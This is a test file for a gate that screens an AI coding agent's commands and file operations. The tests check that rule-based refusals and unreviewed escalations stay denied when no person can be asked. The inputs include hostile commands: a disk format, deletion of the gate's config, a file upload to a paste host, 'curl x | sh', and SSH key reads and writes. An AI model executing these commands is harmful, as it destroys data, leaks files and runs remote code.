import { describe, it, expect } from "bun:test";
import fs from "node:fs";
import path from "node:path";
import { AutoClassifier } from "../src/index.js";
import { StateManager } from "../src/state/state-manager.js";
import { handleAgyInput } from "../src/adapters/agy.js";
import { createOpenCodePlugin } from "../src/adapters/opencode.js";
import type { AppConfig } from "../src/types.js";
import { FakeLlm } from "./helpers/fake-llm.js";
import { tmpStateDir } from "./helpers/tmp-state.js";
import { testConfig } from "./helpers/config.js";

/**
 * An escalation the gate raised: a rule's refusal (self-protection,
 * `rules.fastDeny`, an unsanctioned upload, a protected or credential-looking
 * path), an escalated write, a cut-short script, or an unreachable model's.
 * A rule's refusal escalates on a retry only so that a person can overrule
 * the rule, and none of them had a model's judgement. Where nobody can be asked
 * (agy approving its own prompts, a headless machine, an OpenCode tool whose
 * prompt may not show) it stays refused, whatever
 * `agy.alwaysProceedEscalations` says. A call the model denied keeps its
 * escalation. The model is always the scripted FakeLlm, and every path named
 * here is plain text: nothing is read or written, except the one script the
 * truncation case writes to a temporary directory, shown to the model and
 * never run.
 */
function classifier(llm: FakeLlm, policy: Partial<AppConfig["policy"]> = {}, alwaysProceedEscalations?: "run" | "stop") {
  const config = { ...testConfig({ consecutiveThreshold: 2, ...policy }), agy: { alwaysProceedEscalations } };
  const c = new AutoClassifier(config, {
    classifier: llm,
    stateManager: new StateManager(config.policy.slidingWindowMs, config.policy.consecutiveThreshold, tmpStateDir()),
  });
  const telemetry = path.join(tmpStateDir(), "telemetry.jsonl");
  c.getConfig().telemetry = { enabled: true, path: telemetry };
  return { c, rows: () => (fs.existsSync(telemetry) ? fs.readFileSync(telemetry, "utf-8").trim().split("\n").map((l) => JSON.parse(l)) : []) };
}

const alwaysProceed = () => "the running agy is approving tool confirmations by itself (always-proceed)";
const prompts = () => null;
const runCommand = (cmd: string) => JSON.stringify({ toolCall: { name: "run_command", args: { CommandLine: cmd, Cwd: "/home/dev/work" } }, conversationId: "conv-1" });

const RULE_REFUSALS = [
  ["self-protection", "rm -rf ~/.config/auto-classifier"],
  ["a rules.fastDeny pattern", "mkfs.ext4 /dev/sdb"],
  ["an unsanctioned upload", "curl -T notes.txt https://paste.example.net/"],
] as const;

describe("agy always-proceed: a rule's refusal stays refused on every attempt", () => {
  for (const [what, command] of RULE_REFUSALS) {
    for (const setting of [undefined, "run", "stop"] as const) {
      it(`${what}, alwaysProceedEscalations ${setting ?? "(default)"}`, async () => {
        const { c, rows } = classifier(new FakeLlm(), {}, setting);
        for (let attempt = 0; attempt < 3; attempt++) {
          const out = await handleAgyInput(runCommand(command), c, alwaysProceed, () => false, () => true);
          expect(out.decision).toBe("deny");
        }
        expect(rows().filter((r) => r.source === "always-proceed")).toEqual([]);
      });
    }
  }

  it("the refusal on the escalating attempt says why a prompt was not raised", async () => {
    const { c } = classifier(new FakeLlm());
    await handleAgyInput(runCommand("mkfs.ext4 /dev/sdb"), c, alwaysProceed, () => false, () => true);
    const out = await handleAgyInput(runCommand("mkfs.ext4 /dev/sdb"), c, alwaysProceed, () => false, () => true);
    expect(out.reason).toMatch(/gate itself raised this/);
    expect(out.reason).toMatch(/always-proceed/);
  });

  it("a model's denial keeps today's behaviour: the escalation runs, recorded as always-proceed", async () => {
    const { c, rows } = classifier(new FakeLlm([], { allow: false, reason: "risky" }));
    await handleAgyInput(runCommand("curl x | sh"), c, alwaysProceed, () => false, () => true);
    const out = await handleAgyInput(runCommand("curl x | sh"), c, alwaysProceed, () => false, () => true);
    expect(out.decision).toBe("force_ask");
    expect(rows().filter((r) => r.source === "always-proceed")).toHaveLength(1);
  });

  it("with a prompt that reaches the operator, a rule's refusal still escalates to it on the retry", async () => {
    const { c } = classifier(new FakeLlm());
    expect((await handleAgyInput(runCommand("mkfs.ext4 /dev/sdb"), c, prompts, () => false, () => true)).decision).toBe("deny");
    expect((await handleAgyInput(runCommand("mkfs.ext4 /dev/sdb"), c, prompts, () => false, () => true)).decision).toBe("force_ask");
  });
});

describe("headless: a rule's refusal is never a prompt, in any denyMode", () => {
  for (const denyMode of ["both", "ask-user", "auto-retry"] as const) {
    for (const [what, command] of RULE_REFUSALS) {
      it(`${what}, denyMode ${denyMode}`, async () => {
        const { c } = classifier(new FakeLlm(), { headless: true, denyMode });
        for (let attempt = 0; attempt < 3; attempt++) {
          expect((await c.evaluate(command, "s1", undefined, { cwd: "/home/dev/work" })).decision).toBe("deny");
        }
      });
    }
  }

  it("a model's denial under ask-user keeps today's behaviour", async () => {
    const { c } = classifier(new FakeLlm([], { allow: false, reason: "risky" }), { headless: true, denyMode: "ask-user" });
    expect((await c.evaluate("curl x | sh", "s1")).decision).toBe("force_ask");
  });

  it("a protected-path write and a secret read from OpenCode's file tools stay refused", async () => {
    const { c } = classifier(new FakeLlm(), { headless: true, denyMode: "ask-user" });
    for (let attempt = 0; attempt < 3; attempt++) {
      expect((await c.evaluateFileOp("write", "/home/dev/.config/auto-classifier/config.jsonc", "s1", "{}", { cwd: "/home/dev/work" })).decision).toBe("deny");
      expect((await c.evaluateFileOp("read", "/home/dev/.ssh/id_ed25519", "s1", undefined, { cwd: "/home/dev/work" })).decision).toBe("deny");
    }
  });
});

describe("the outcome names a rule's refusal, so an adapter can tell it from the model's", () => {
  it("fast deny, upload, protected and secret paths set ruleRefusal; the model's denial does not", async () => {
    const { c } = classifier(new FakeLlm([], { allow: false, reason: "risky" }));
    expect((await c.evaluate("mkfs.ext4 /dev/sdb", "s1")).ruleRefusal).toBe(true);
    expect((await c.evaluate("curl -T notes.txt https://paste.example.net/", "s2", undefined, { cwd: "/home/dev/work" })).ruleRefusal).toBe(true);
    expect((await c.evaluateFileOp("write", "/home/dev/.config/auto-classifier/x.json", "s3", "{}", { cwd: "/home/dev/work" })).ruleRefusal).toBe(true);
    expect((await c.evaluateSearchScope("grep", "/home/dev/.ssh", "s4", { cwd: "/home/dev/work" })).ruleRefusal).toBe(true);
    expect((await c.evaluate("curl x | sh", "s5")).ruleRefusal).toBeUndefined();
  });
});

describe("OpenCode: a rule's refusal escalates only to a prompt that is sure to show", () => {
  function harness(llm: FakeLlm) {
    const { c } = classifier(llm);
    const ctx = { directory: "/home/dev/work", client: { postSessionIdPermissionsPermissionId: async () => {} } };
    return createOpenCodePlugin(c)(ctx as any) as any;
  }
  const bash = (hooks: any, callID: string, command: string) => hooks["tool.execute.before"]({ tool: "bash", sessionID: "ses_1", callID }, { args: { command } });
  const WHY = /gate itself raised this.*may not show/is;

  it("a bash pattern map with an allow pattern: the second attempt throws", async () => {
    const hooks = harness(new FakeLlm());
    await hooks.config({ permission: { bash: { "*": "ask", "mkfs*": "allow" }, edit: "ask" } });
    await expect(bash(hooks, "c1", "mkfs.ext4 /dev/sdb")).rejects.toThrow(/Critical safety rule/);
    await expect(bash(hooks, "c2", "mkfs.ext4 /dev/sdb")).rejects.toThrow(WHY);
  });

  it("before OpenCode's config arrives: the second attempt throws", async () => {
    const hooks = harness(new FakeLlm());
    await expect(bash(hooks, "c1", "mkfs.ext4 /dev/sdb")).rejects.toThrow(/Critical safety rule/);
    await expect(bash(hooks, "c2", "mkfs.ext4 /dev/sdb")).rejects.toThrow(WHY);
  });

  it("bash \"ask\" as a plain string: the second attempt is left for the prompt", async () => {
    const hooks = harness(new FakeLlm());
    await hooks.config({ permission: { bash: "ask", edit: "ask" } });
    await expect(bash(hooks, "c1", "mkfs.ext4 /dev/sdb")).rejects.toThrow(/Critical safety rule/);
    await bash(hooks, "c2", "mkfs.ext4 /dev/sdb");
  });

  it("a model's denial keeps today's behaviour under the same pattern map and before the config", async () => {
    const mapped = harness(new FakeLlm([], { allow: false, reason: "risky" }));
    await mapped.config({ permission: { bash: { "*": "ask", "git *": "allow" }, edit: "ask" } });
    await expect(bash(mapped, "c1", "curl x | sh")).rejects.toThrow(/risky/);
    await bash(mapped, "c2", "curl x | sh");

    const early = harness(new FakeLlm([], { allow: false, reason: "risky" }));
    await expect(bash(early, "c1", "curl x | sh")).rejects.toThrow(/risky/);
    await bash(early, "c2", "curl x | sh");
  });
});

/**
 * An escalation the gate raised without refusing anything (an agy file
 * write outside the workspace or into a sensitive place, a script the gate
 * cut short before the model saw it whole) is the same kind of thing: it
 * exists for a person to decide. So it is refused wherever nobody
 * can be asked, whatever `agy.alwaysProceedEscalations` says. Only an
 * escalation the model raised follows that setting.
 */
const writeFile = (target: string) =>
  JSON.stringify({ toolCall: { name: "write_to_file", args: { TargetFile: target, CodeContent: "ssh-ed25519 AAAA… someone" } }, conversationId: "conv-1", workspacePaths: ["/home/dev/work"] });

const DETERMINISTIC_WRITES = [
  ["a credential-looking path", "/home/dev/.ssh/authorized_keys"],
  ["a path outside the workspace", "/srv/app/run.sh"],
  ["a git hook inside the workspace", "/home/dev/work/.git/hooks/pre-commit"],
] as const;

describe("agy always-proceed: a deterministic escalation is refused, never run", () => {
  for (const [what, target] of DETERMINISTIC_WRITES) {
    for (const setting of [undefined, "run", "stop"] as const) {
      it(`write_to_file to ${what}, alwaysProceedEscalations ${setting ?? "(default)"}`, async () => {
        const { c, rows } = classifier(new FakeLlm(), {}, setting);
        for (let attempt = 0; attempt < 2; attempt++) {
          const out = await handleAgyInput(writeFile(target), c, alwaysProceed, () => false, () => true);
          expect(out.decision).toBe("deny");
          expect(out.reason).toMatch(/gate itself raised this/);
        }
        expect(rows().filter((r) => r.source === "always-proceed")).toEqual([]);
      });
    }
  }

  it("a script the gate cut short: the model's allow is not run unattended", async () => {
    const dir = tmpStateDir();
    fs.writeFileSync(path.join(dir, "run.sh"), "#!/bin/sh\n" + "echo line\n".repeat(300));
    const config = { ...testConfig(), agy: {} };
    config.llm = { ...config.llm, provider: "openai", maxFileChars: 2000 };
    const c = new AutoClassifier(config, {
      classifier: new FakeLlm([], { allow: true, reason: "looks fine" }),
      stateManager: new StateManager(config.policy.slidingWindowMs, config.policy.consecutiveThreshold, tmpStateDir()),
      git: () => ({ status: 128, stdout: "" }),
    });
    const call = JSON.stringify({ toolCall: { name: "run_command", args: { CommandLine: "sh ./run.sh", Cwd: dir } }, conversationId: "conv-1" });
    const out = await handleAgyInput(call, c, alwaysProceed, () => false, () => true);
    expect(out.decision).toBe("deny");
    expect(out.reason).toMatch(/truncated/);
  });

  it("with a prompt that reaches the operator, the same write still escalates to it", async () => {
    const { c } = classifier(new FakeLlm());
    const out = await handleAgyInput(writeFile("/home/dev/.ssh/authorized_keys"), c, prompts, () => false, () => true);
    expect(out.decision).toBe("force_ask");
  });
});

describe("agy headless: no escalation is left at a prompt nobody can answer", () => {
  for (const [what, target] of DETERMINISTIC_WRITES) {
    it(`write_to_file to ${what}`, async () => {
      const { c } = classifier(new FakeLlm(), { headless: true });
      const out = await handleAgyInput(writeFile(target), c, prompts, () => false, () => true);
      expect(out.decision).toBe("deny");
      expect(out.reason).toMatch(/headless/);
    });
  }

  it("a model's escalation under denyMode ask-user", async () => {
    const { c } = classifier(new FakeLlm([], { allow: false, reason: "risky" }), { headless: true, denyMode: "ask-user" });
    const out = await handleAgyInput(runCommand("curl x | sh"), c, prompts, () => false, () => true);
    expect(out.decision).toBe("deny");
    expect(out.reason).toMatch(/headless/);
  });
});

describe("agy telemetry records a refusal it kept", () => {
  it("a deterministic escalation kept under always-proceed: one deny row, source gate-kept", async () => {
    const { c, rows } = classifier(new FakeLlm());
    await handleAgyInput(writeFile("/home/dev/.ssh/authorized_keys"), c, alwaysProceed, () => false, () => true);
    const kept = rows().filter((r) => r.source === "gate-kept");
    expect(kept).toHaveLength(1);
    expect(kept[0].decision).toBe("deny");
    expect(kept[0].file_path).toBe("/home/dev/.ssh/authorized_keys");
    expect(kept[0].session).toBe("conv-1");
  });

  it("a fast-deny kept on its escalating attempt: a gate-kept row", async () => {
    const { c, rows } = classifier(new FakeLlm());
    await handleAgyInput(runCommand("mkfs.ext4 /dev/sdb"), c, alwaysProceed, () => false, () => true);
    await handleAgyInput(runCommand("mkfs.ext4 /dev/sdb"), c, alwaysProceed, () => false, () => true);
    const kept = rows().filter((r) => r.source === "gate-kept");
    expect(kept).toHaveLength(1);
    expect(kept[0].command).toBe("mkfs.ext4 /dev/sdb");
  });

  it("a model's escalation blocked under \"stop\": one deny row, source no-prompt", async () => {
    const { c, rows } = classifier(new FakeLlm([], { allow: false, reason: "risky" }), {}, "stop");
    await handleAgyInput(runCommand("curl x | sh"), c, alwaysProceed, () => false, () => true);
    await handleAgyInput(runCommand("curl x | sh"), c, alwaysProceed, () => false, () => true);
    const blocked = rows().filter((r) => r.source === "no-prompt");
    expect(blocked).toHaveLength(1);
    expect(blocked[0].decision).toBe("deny");
  });

  it("an escalation that reaches a prompt writes no such row", async () => {
    const { c, rows } = classifier(new FakeLlm());
    await handleAgyInput(writeFile("/home/dev/.ssh/authorized_keys"), c, prompts, () => false, () => true);
    expect(rows().filter((r) => r.source === "gate-kept" || r.source === "no-prompt")).toEqual([]);
  });
});

/**
 * A model that could not be reached (an error, a timeout, a chain with no
 * fallback left) judged nothing, so the escalation its fail-closed denials
 * build up to has had no judgement from anyone. Where nobody can be asked it
 * is refused, exactly like one a rule raised.
 */
const down = () => new FakeLlm([], new Error("connection refused") as any);

describe("an unreachable model's escalation is refused where nobody can be asked", () => {
  for (const setting of [undefined, "run", "stop"] as const) {
    it(`agy always-proceed, alwaysProceedEscalations ${setting ?? "(default)"}`, async () => {
      const { c, rows } = classifier(down(), {}, setting);
      for (let attempt = 0; attempt < 3; attempt++) {
        const out = await handleAgyInput(runCommand("curl x | sh"), c, alwaysProceed, () => false, () => true);
        expect(out.decision).toBe("deny");
      }
      expect(rows().filter((r) => r.source === "always-proceed")).toEqual([]);
      expect(rows().filter((r) => r.source === "gate-kept").length).toBeGreaterThan(0);
    });
  }

  it("the outcome marks it gateRaised; a model's own denial does not", async () => {
    const { c } = classifier(down());
    await c.evaluate("curl x | sh", "s1");
    const escalated = await c.evaluate("curl x | sh", "s1");
    expect(escalated.decision).toBe("force_ask");
    expect(escalated.gateRaised).toBe(true);
    const judged = classifier(new FakeLlm([], { allow: false, reason: "risky" })).c;
    await judged.evaluate("curl x | sh", "s1");
    expect((await judged.evaluate("curl x | sh", "s1")).gateRaised).toBeUndefined();
  });

  it("an OpenCode file tool's unreachable-model escalation is marked the same way", async () => {
    const { c } = classifier(down());
    await c.evaluateFileOp("write", "/srv/app/x.conf", "s1", "x", { cwd: "/home/dev/work" });
    expect((await c.evaluateFileOp("write", "/srv/app/x.conf", "s1", "x", { cwd: "/home/dev/work" })).gateRaised).toBe(true);
  });

  it("agy headless, denyMode ask-user", async () => {
    const { c } = classifier(down(), { headless: true, denyMode: "ask-user" });
    expect((await handleAgyInput(runCommand("curl x | sh"), c, prompts, () => false, () => true)).decision).toBe("deny");
  });

  it("with a prompt that reaches the operator, it still escalates to it", async () => {
    const { c } = classifier(down());
    await handleAgyInput(runCommand("curl x | sh"), c, prompts, () => false, () => true);
    expect((await handleAgyInput(runCommand("curl x | sh"), c, prompts, () => false, () => true)).decision).toBe("force_ask");
  });

  describe("OpenCode already refuses it where nobody can be asked", () => {
    const plugin = (policy: Partial<AppConfig["policy"]>) => {
      const { c } = classifier(down(), policy);
      const ctx = { directory: "/home/dev/work", client: { postSessionIdPermissionsPermissionId: async () => {} } };
      return createOpenCodePlugin(c)(ctx as any) as any;
    };
    const bash = (hooks: any, callID: string) => hooks["tool.execute.before"]({ tool: "bash", sessionID: "ses_1", callID }, { args: { command: "curl x | sh" } });

    it("headless", async () => {
      const hooks = plugin({ headless: true, denyMode: "ask-user" });
      await expect(bash(hooks, "c1")).rejects.toThrow(/headless/);
    });

    it("a bash permission that raises no prompt", async () => {
      const hooks = plugin({});
      await hooks.config({ permission: { bash: "allow", edit: "ask" } });
      await expect(bash(hooks, "c1")).rejects.toThrow(/unreachable/);
      await expect(bash(hooks, "c2")).rejects.toThrow(/No permission prompt reaches the user/);
    });
  });
});

/**
 * OpenCode holds every escalation the gate raised, not only a rule's refusal,
 * to the same bar: it waits only on a prompt that is sure to show.
 */
describe("OpenCode: an escalation the gate raised waits only on a prompt that is sure to show", () => {
  function harness(llm: FakeLlm, setup: (c: AutoClassifier) => void = () => {}) {
    const { c } = classifier(llm);
    setup(c);
    const ctx = { directory: "/home/dev/work", client: { postSessionIdPermissionsPermissionId: async () => {} } };
    return createOpenCodePlugin(c)(ctx as any) as any;
  }
  const bash = (hooks: any, callID: string, command: string, workdir?: string) =>
    hooks["tool.execute.before"]({ tool: "bash", sessionID: "ses_1", callID }, { args: workdir ? { command, workdir } : { command } });
  const write = (hooks: any, callID: string, filePath: string) =>
    hooks["tool.execute.before"]({ tool: "write", sessionID: "ses_1", callID }, { args: { filePath, content: "x" } });
  const HELD = /gate itself raised this.*may not show/is;

  it("an unreachable model's escalation, under a bash pattern map with an allow pattern", async () => {
    const hooks = harness(down());
    await hooks.config({ permission: { bash: { "*": "ask", "make *": "allow" }, edit: "ask" } });
    await expect(bash(hooks, "c1", "make build")).rejects.toThrow(/unreachable/);
    await expect(bash(hooks, "c2", "make build")).rejects.toThrow(HELD);
  });

  it("before OpenCode's config arrives, only a rule's refusal is held; an unreachable model's escalation is left for the prompt bash is taken to have", async () => {
    const hooks = harness(down());
    await expect(bash(hooks, "c1", "make build")).rejects.toThrow(/unreachable/);
    await bash(hooks, "c2", "make build");
  });

  it("a script cut short before the model saw it whole, under the same pattern map", async () => {
    const dir = tmpStateDir();
    fs.writeFileSync(path.join(dir, "run.sh"), "#!/bin/sh\n" + "echo line\n".repeat(300));
    const hooks = harness(new FakeLlm([], { allow: true, reason: "looks fine" }), (c) => {
      c.getConfig().llm = { ...c.getConfig().llm, provider: "openai", maxFileChars: 2000 };
    });
    await hooks.config({ permission: { bash: { "*": "ask", "sh *": "allow" }, edit: "ask" } });
    await expect(bash(hooks, "c1", "sh ./run.sh", dir)).rejects.toThrow(HELD);
  });

  it("a sensitive workspace write, under an edit pattern map with an allow pattern", async () => {
    const hooks = harness(new FakeLlm());
    await hooks.config({ permission: { bash: "ask", edit: { "*": "ask", ".git/**": "allow" } } });
    await expect(write(hooks, "c1", "/home/dev/work/.git/hooks/pre-commit")).rejects.toThrow(HELD);
  });

  it("a plain \"ask\" leaves each of them for the prompt", async () => {
    const hooks = harness(down());
    await hooks.config({ permission: { bash: "ask", edit: "ask" } });
    await expect(bash(hooks, "c1", "make build")).rejects.toThrow(/unreachable/);
    await bash(hooks, "c2", "make build");
    await write(hooks, "c3", "/home/dev/work/.git/hooks/pre-commit");
  });

  it("a model's own escalation under the allow pattern is still left for OpenCode", async () => {
    const hooks = harness(new FakeLlm([], { allow: false, reason: "risky" }));
    await hooks.config({ permission: { bash: { "*": "ask", "make *": "allow" }, edit: "ask" } });
    await expect(bash(hooks, "c1", "make build")).rejects.toThrow(/risky/);
    await bash(hooks, "c2", "make build");
  });
});
